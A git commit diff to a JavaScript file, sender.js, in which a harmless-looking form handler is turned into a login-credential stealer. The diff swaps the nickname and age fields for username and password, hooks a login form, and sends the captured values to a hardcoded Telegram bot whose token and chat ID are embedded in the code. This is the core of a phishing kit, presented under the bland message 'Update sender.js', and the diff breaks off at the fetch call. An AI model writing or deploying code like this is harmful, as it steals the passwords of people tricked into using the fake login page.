1cdf471f4001383eeadefaad67f873b35147a280
Batriox7 <faysalrahal36@gmail.com>
2026-07-17 23:14:50 +0100

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,16 +1,16 @@
-document.querySelector('.send-button').closest('form').addEventListener('submit', function(e) {
+document.querySelector('.login-button').closest('form').addEventListener('submit', function(e) {
     e.preventDefault();
 
     // 1. Put your actual Telegram details here
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-    const CHAT_ID = 'YOUR_CHAT_ID';
+    const BOT_TOKEN = '8827810558:AAHMgMCCghkPCwHduz0SMk9bppzOhypKtVI';
+    const CHAT_ID = '5092429629';
 
     // 2. Grabs the values from your HTML inputs using their IDs
-    const nickname = document.getElementById('nickname').value;
-    const age = document.getElementById('age').value;
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
     // 3. Creates the message layout
-    const text = `📩 New Entry\n👤 Nickname: ${nickname}\n🎂 Age: ${age}`;
+    const text = `📩 New Entry\n👤 username: ${username}\n🎂 password: ${password}`;
 
     // 4. Sends it to Telegram
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
